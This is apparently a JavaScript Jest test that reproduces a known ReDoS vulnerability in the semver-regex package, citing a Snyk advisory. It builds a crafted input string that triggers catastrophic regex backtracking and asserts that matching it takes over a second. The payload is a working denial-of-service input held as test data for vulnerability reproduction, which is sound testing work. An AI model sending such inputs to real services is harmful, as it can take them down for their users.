//https://security.snyk.io/vuln/SNYK-JS-SEMVERREGEX-1585624
test("ReDos in semver-regex", () => {
  const measureTime = require("../utils").measureTime;
  const semverRegex = require("semver-regex");

  let payload = "0.0.0-0" + ".-------".repeat(9) + "@";

  let t = measureTime(function () {
    semverRegex().test(payload);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
